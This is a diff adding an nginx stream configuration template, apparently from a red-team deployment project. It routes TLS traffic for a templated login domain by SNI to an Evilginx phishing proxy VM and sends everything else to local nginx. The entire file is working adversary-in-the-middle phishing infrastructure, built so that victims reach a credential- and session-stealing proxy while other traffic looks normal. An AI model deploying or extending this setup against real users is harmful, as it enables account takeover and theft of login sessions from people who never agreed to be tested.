@@ -1,0 +1,23 @@
+# TCP passthrough on 443: SNI login.* -> Evilginx VM:443; all other names -> local nginx TLS (http block).
+# Evilginx presents its own certificate to clients for {{ login_domain }}.
+
+map $ssl_preread_server_name $aegis_stream_upstream {
+    {{ login_domain }}    aegis_evilginx;
+    default               aegis_local_https;
+}
+
+upstream aegis_evilginx {
+    server {{ groups['evilginx'][0] }}:443;
+}
+
+upstream aegis_local_https {
+    server 127.0.0.1:{{ redirector_internal_ssl_port | default(8443) }};
+}
+
+server {
+    listen 443;
+    ssl_preread on;
+    proxy_pass $aegis_stream_upstream;
+    proxy_connect_timeout 10s;
+    proxy_timeout 24h;
+}
